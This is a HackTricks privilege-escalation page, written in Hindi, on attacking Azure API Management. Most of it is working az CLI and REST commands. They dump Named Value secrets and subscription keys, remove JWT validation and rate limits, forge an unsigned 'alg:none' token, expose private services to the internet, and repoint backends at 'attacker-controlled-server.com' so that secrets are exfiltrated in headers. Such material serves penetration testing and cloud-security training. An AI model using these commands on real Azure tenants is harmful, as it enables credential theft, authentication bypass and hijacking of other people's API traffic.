# Az - API Management Privesc

{{#include ../../../banners/hacktricks-training.md}}

## `Microsoft.ApiManagement/service/namedValues/read` & `Microsoft.ApiManagement/service/namedValues/listValue/action`

इस हमले में Azure API Management Named Values में संग्रहीत संवेदनशील secrets तक पहुँच शामिल है — या तो सीधे secret values को प्राप्त करके, या managed identities के माध्यम से Key Vault–backed secrets प्राप्त करने के लिए permissions का दुरुपयोग करके।
```bash
az apim nv show-secret --resource-group <resource-group> --service-name <service-name> --named-value-id <named-value-id>
```
## `Microsoft.ApiManagement/service/subscriptions/read` & `Microsoft.ApiManagement/service/subscriptions/listSecrets/action`
प्रत्येक subscription के लिए, attacker listSecrets endpoint को POST method के साथ इस्तेमाल करके subscription keys प्राप्त कर सकता है:
```bash
az rest --method POST \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/subscriptions/<subscription-sid>/listSecrets?api-version=2024-05-01"
```
प्रतिक्रिया में subscription primary key (primaryKey) और secondary key (secondaryKey) शामिल होते हैं। इन कुंजियों के साथ, हमलावर API Management Gateway के माध्यम से प्रकाशित किए गए APIs को प्रमाणीकृत करके एक्सेस कर सकता है:
```bash
curl -H "Ocp-Apim-Subscription-Key: <primary-key-or-secondary-key>" \
https://<service-name>.azure-api.net/<api-path>
```
एक हमलावर उस subscription से जुड़े सभी APIs और products तक पहुँच बना सकता है। यदि subscription को संवेदनशील products या APIs तक पहुँच है, तो हमलावर गोपनीय जानकारी प्राप्त कर सकता है या अनधिकृत ऑपरेशन कर सकता है।

## `Microsoft.ApiManagement/service/policies/write` or `Microsoft.ApiManagement/service/apis/policies/write`

हमलावर पहले वर्तमान API policy को प्राप्त करता है:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/?api-version=2024-05-01&format=rawxml"
```
हमलावर अपनी उद्देश्यों के अनुसार नीति को कई तरीकों से संशोधित कर सकता है। उदाहरण के लिए, प्रमाणीकरण को अक्षम करने के लिए, यदि नीति में JWT token validation शामिल है, तो हमलावर उस अनुभाग को हटा सकता है या उसे टिप्पणी में बदल सकता है:
```xml
<policies>
<inbound>
<base />
<!-- JWT validation removed by the attacker -->
<!-- <validate-jwt header-name="Authorization" failed-validation-httpcode="401" >
...
</validate-jwt> -->
</inbound>
<backend>
<base />
</backend>
<outbound>
<base />
</outbound>
<on-error>
<base />
</on-error>
</policies>
```
rate limiting controls को हटाकर और denial-of-service attacks की अनुमति देने के लिए, हमलावर quota और rate-limit policies को हटा सकता है या comment out कर सकता है:
```xml
<policies>
<inbound>
<base />
<!-- Rate limiting removed by the attacker -->
<!-- <rate-limit calls="100" renewal-period="60" />
<quota-by-key calls="1000" renewal-period="3600" counter-key="@(context.Subscription.Id)" /> -->
</inbound>
...
</policies>
```
बैकएंड रूट को संशोधित करने और ट्रैफिक को एक हमलावर-नियंत्रित सर्वर पर रीडायरेक्ट करने के लिए:
```xml
<policies>
...
<inbound>
<base />
<set-backend-service base-url="https://attacker-controlled-server.com" />
</inbound>
...
</policies>
```
आक्रमणकर्ता फिर संशोधित नीति लागू करता है। अनुरोध बॉडी में XML फ़ॉर्मैट में नीति होने वाला JSON ऑब्जेक्ट होना चाहिए:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/apis/<api-id>/policies/policy?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"format": "rawxml",
"value": "<policies><inbound><base /></inbound><backend><base /></backend><outbound><base /></outbound><on-error><base /></on-error></policies>"
}
}'
```
## JWT वैलिडेशन की गलत कॉन्फ़िगरेशन

attacker को यह पता होना चाहिए कि एक API JWT token validation का उपयोग करती है और कि policy गलत कॉन्फ़िगर है। गलत तरीके से कॉन्फ़िगर की गई JWT validation policies में `require-signed-tokens="false"` या `require-expiration-time="false"` हो सकता है, जो service को unsigned tokens या ऐसे tokens स्वीकार करने की अनुमति देता है जो कभी expire नहीं होते।

attacker एक malicious JWT token बनाता है जो none algorithm (unsigned) का उपयोग करता है:
```
# Header: {"alg":"none"}
# Payload: {"sub":"user"}
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0.
```
attacker दुष्ट token का उपयोग करके API को request भेजता है:
```bash
curl -X GET \
-H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0." \
https://<apim>.azure-api.net/path
```
यदि नीति `require-signed-tokens="false"` के साथ गलत कॉन्फ़िगर की गई है, तो सेवा unsigned token को स्वीकार कर लेगी। attacker `require-expiration-time="false"` होने पर expiration claim के बिना token भी बना सकता है।

## `Microsoft.ApiManagement/service/applynetworkconfigurationupdates/action`
attacker पहले सेवा की वर्तमान नेटवर्क कॉन्फ़िगरेशन की जाँच करता है:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01"
```
हमलावर JSON response की समीक्षा करके `publicNetworkAccess` और `virtualNetworkType` के मानों की पुष्टि करता है। यदि `publicNetworkAccess` false पर सेट है या `virtualNetworkType` Internal पर सेट है, तो सेवा private access के लिए कॉन्फ़िगर की गई है।

सेवा को इंटरनेट पर एक्सपोज़ करने के लिए, हमलावर को दोनों सेटिंग्स बदलनी होंगी। यदि सेवा internal mode (`virtualNetworkType: "Internal"`) में चल रही है, तो हमलावर इसे None या External में बदलकर public network access सक्षम कर देता है। यह Azure Management API का उपयोग करके किया जा सकता है:
```bash
az rest --method PATCH \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<apim>?api-version=2024-05-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"publicNetworkAccess": "Enabled",
"virtualNetworkType": "None"
}
}'
```
एक बार `virtualNetworkType` को `None` या `External` पर सेट कर दिया जाए और `publicNetworkAccess` सक्षम हो, तो service और इसकी सभी APIs इंटरनेट से पहुँच योग्य हो जाती हैं, भले ही वे पहले private network या private endpoints के पीछे सुरक्षित थीं।

## `Microsoft.ApiManagement/service/backends/write`
हमलावर पहले मौजूदा backends को सूचीबद्ध करता है ताकि वह पहचान सके कि किसे modify करना है:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends?api-version=2024-05-01"
```
अटैकर उस backend की वर्तमान configuration प्राप्त करता है जिसे वे संशोधित करना चाहते हैं:
```bash
az rest --method GET \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01"
```
हमलावर backend URL को अपने नियंत्रण वाले server की ओर इंगित करने के लिए बदल देता है। पहले वे पिछले response से ETag प्राप्त करते हैं और फिर backend को अपडेट करते हैं:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"description": "Backend modified by attacker"
}
}'
```
वैकल्पिक रूप से, attacker backend headers को configure करके Named Values जिनमें secrets होते हैं, exfiltrate कर सकता है। यह backend credentials configuration के माध्यम से किया जाता है:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<resource-group>/providers/Microsoft.ApiManagement/service/<service-name>/backends/<backend-id>?api-version=2024-05-01" \
--headers "Content-Type=application/json" "If-Match=*" \
--body '{
"properties": {
"url": "https://attacker-controlled-server.com",
"protocol": "http",
"credentials": {
"header": {
"X-Secret-Value": ["{{named-value-secret}}"]
}
}
}
}'
```
इस कॉन्फ़िगरेशन के साथ, Named Values सभी अनुरोधों में headers के रूप में attacker-controlled backend को भेजे जाते हैं, जिससे संवेदनशील secrets का exfiltration संभव हो जाता है।

{{#include ../../../banners/hacktricks-training.md}}
